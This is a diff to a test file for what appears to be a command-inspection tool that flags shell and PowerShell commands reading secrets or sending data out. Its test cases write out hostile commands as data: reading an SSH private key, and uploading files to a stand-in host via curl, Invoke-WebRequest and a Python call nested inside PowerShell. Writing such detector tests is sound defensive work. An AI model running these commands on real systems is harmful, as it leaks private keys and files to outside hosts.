@@ -210,7 +210,7 @@ describe("credential and sender catalogue parity", () => {
     { command: "bash --noprofile --norc -p -c 'cat \"/home/owner/.ssh/id_rsa\"'", sensitive: "**/.ssh/**", exfiltration: false },
     { command: "bash -c 'curl -T notes.txt http://e'", sensitive: null, exfiltration: true },
     { command: "pwsh -c 'iwr http://e -InFile f -Method Post'", sensitive: null, exfiltration: true },
-    { command: "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'", sensitive: null, exfiltration: false },
+    { command: "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'", sensitive: null, exfiltration: true },
   ])("retains visible paths when child startup is unproven: $command", ({ command, sensitive, exfiltration }) => {
     expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive, exfiltration: exfiltration ? expect.any(String) : null });
     if (exfiltration) expect(decision(command)).toMatchObject(FLOOR_DECISION);
